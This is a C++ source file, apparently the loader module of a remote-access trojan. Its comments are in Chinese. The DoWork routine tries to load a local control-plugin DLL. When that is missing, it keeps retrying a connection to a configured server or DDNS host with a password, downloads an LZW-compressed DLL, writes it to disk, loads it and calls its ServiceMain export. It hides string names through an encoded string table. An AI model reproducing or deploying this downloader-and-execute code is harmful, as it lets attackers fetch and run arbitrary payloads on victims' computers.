// MyWorkMoudle.cpp: implementation of the CMyWorkMoudle class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyWorkMoudle.h"
#include "MyClientTran.h"
#include "Lzw.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyWorkMoudle::CMyWorkMoudle()
{
	m_gFunc.memset(m_ModFilePath, 0, sizeof(m_ModFilePath));
	hCtrMd = NULL;
	nParentThreadId = 0;
}

CMyWorkMoudle::~CMyWorkMoudle()
{

}

HMODULE CMyWorkMoudle::GetModFile(char* pFilePath, UINT nCmd)
{
	//连接服务器，上送本地文件校验码
	CMyClientTran m_Tran;
	if(!m_Tran.Create(nCmd, m_DllInfo.m_ServerAddr, m_DllInfo.m_ServerPort, m_DllInfo.m_DdnsUrl, m_DllInfo.m_PassWord))
	{
		return NULL;
	}

	//接收文件长度
	DWORD nFileLen = 0;
	if(!m_Tran.RecvData(&nFileLen, sizeof(DWORD)))
	{
		return NULL;
	}

	//接收文件
	BYTE* pZipFileData = new BYTE[nFileLen];
	m_gFunc.memset(pZipFileData, 0, nFileLen);
	if(!m_Tran.RecvData(pZipFileData, nFileLen))
	{
		delete [] pZipFileData;
		return NULL;
	}

	//解压数据
	FCLzw lzw;
	BYTE* pUnZipFileData = NULL;
	DWORD nUnZipFileLen = 0;
	lzw.PcUnZip(pZipFileData, &pUnZipFileData, &nFileLen);
	delete [] pZipFileData;
	WriteMyFile(pFilePath, pUnZipFileData, nFileLen);

	//装载DLL文件
	return LoadLibrary(pFilePath);
}

void CMyWorkMoudle::DoWork()
{
	//ctr.dll
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10233, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//确定功能dll目录
	m_gFunc.GetModuleFileName(m_ghInstance, m_ModFilePath, 200);
	char* pFind = m_gFunc.strrchr(m_ModFilePath, '.');
	if(pFind != NULL)
	{
		*pFind = 0;
		m_gFunc.strcat(pFind, m_TmpStr);
	}

	//尝试装载控制插件dll
	hCtrMd = LoadLibrary(m_ModFilePath);
	if(hCtrMd == NULL)
	{
		//下载控制插件
		while(1)
		{
			//下载工作插件到本地
			hCtrMd = GetModFile(m_ModFilePath, WM_CONNECT_DMOD);
			if(hCtrMd == NULL)
			{
				//休息等待指定时间
				m_gFunc.Sleep(m_DllInfo.m_DelayTime);
			}
			else
			{
				break;
			}
		}
	}

	//ServiceMain
	m_gFunc.GetMyString(10198, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//开始工作
	SERVICEMAINPCMAIN ServiceMain = (SERVICEMAINPCMAIN) GetProcAddress(hCtrMd, m_TmpStr);
	if(ServiceMain != NULL)
	{
		ServiceMain((HWND) DLL_LOAD_FLAG, m_ghInstance, (char*) &m_DllInfo, DLL_LOAD_FLAG);
	}
	FreeLibrary(hCtrMd);

	//通知父线程退出
	if(nParentThreadId != 0)
	{
		while(!m_gFunc.PostThreadMessage(nParentThreadId, WM_CLOSE_CLIENT_THREAD, 0, 0))
		{
			m_gFunc.Sleep(10);
		}
	}
}


